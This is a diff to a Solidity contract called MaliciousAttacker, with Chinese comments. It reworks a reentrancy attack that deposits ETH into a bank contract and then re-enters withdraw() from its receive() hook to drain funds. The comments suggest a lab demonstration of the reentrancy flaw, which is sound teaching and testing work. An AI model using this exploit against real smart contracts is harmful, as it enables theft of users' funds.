@@ -14,21 +14,22 @@ contract MaliciousAttacker {
 
     // 攻击入口：存 1 ETH，然后疯狂提现
     function attack() external payable {
-        require(msg.value >= 1 wei, "Must send some ETH");
-        // Deposit 1 wei to have a balance in the bank
-        (bool success, ) = address(bank).call{value: msg.value}("");
-        require(success, "Deposit failed");
-        // Call withdraw to trigger the reentrancy
-        bank.withdraw(msg.value); // Withdraw the amount sent
+        require(msg.value >= 1 ether, "Must send at least 1 ETH");
+        // 先存款建立余额
+        bank.deposit{value: msg.value}();
+        // 然后开始提取，触发重入
+        bank.withdraw(msg.value); // 提取刚存入的金额
     }
 
     // ⚡ 关键！当收到 ETH 时自动重入
     receive() external payable {
-        // Limit the number of recursive calls to avoid running out of gas
-        if (address(bank).balance >= 1 ether && callCount < MAX_CALLS) {
+        if (callCount < MAX_CALLS) {
             callCount++;
-            // Attempt to withdraw 1 ETH from the bank
-            bank.withdraw(1 ether);
+            // 检查自己在银行的余额是否足够进行下一次提取
+            uint256 myBalance = bank.balances(address(this));
+            if (myBalance >= 1 ether) {
+                bank.withdraw(1 ether);
+            }
         }
     }
 
